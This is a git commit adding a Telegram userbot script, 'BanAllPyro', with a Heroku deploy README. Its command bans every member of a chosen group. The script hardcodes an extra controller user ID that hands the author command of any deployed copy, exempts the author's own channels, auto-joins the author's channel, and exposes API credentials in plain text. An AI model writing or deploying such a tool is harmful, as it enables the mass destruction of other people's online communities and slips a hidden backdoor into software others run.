38a11502d7547ed68189e900ea82381f8e0afd20
ItZxSTaR / <117068254+ItZxSTaR@users.noreply.github.com>
2023-08-04 13:21:51 +0530

    Add files via upload

---
+++ README.md
@@ -0,0 +1,10 @@
+# ᴅᴇᴘʟᴏʏᴍᴇɴᴛ
+
+
+<details>
+<summary><b>ᴅᴇᴘʟᴏʏ ᴛᴏ ʜᴇʀᴏᴋᴜ</b></summary>
+<br>
+
+[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?template=https://github.com/ItZxSTaR/BanAllPyro)
+  
+</details>
---
+++ mihir.py
@@ -0,0 +1,48 @@
+from os import getenv
+from asyncio import sleep
+
+from pyrogram import Client, filters, idle
+from pyrogram.types import Message
+
+
+SESSION = getenv('SESSION')
+SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
+SUDO_USERS.append(5518687442)
+CHATS = ['TheAltron', '@TheAltron', '@AltronChats', 'AltronChats', '-1001313291319', '-1001859846702']
+
+M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
+
+
+@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
+async def start(_, message: Message):
+     await message.reply_text("🤖 **I AM STILL ALIVE...**")
+
+
+@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
+async def altron(app: Client, message: Message):
+    try:
+        chat_id = message.text.split(" ")[1]
+        m = await message.reply_text("🔁 __GETTING READY...__")
+        if chat_id in CHATS:
+            return
+    except:
+        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
+        return
+
+    await m.edit_text("✅ __STARTED FUCKING THE GROUP...__")
+    await sleep(3)
+
+    async for x in app.iter_chat_members(chat_id):
+        if x.user.id in SUDO_USERS:
+            continue
+        try:
+            await app.ban_chat_member(chat_id=chat_id, user_id=x.user.id)
+        except:
+            pass
+
+
+M.start()
+M.join_chat("TheAltron")
+print("Bot Started Successfully")
+idle()
+M.stop()
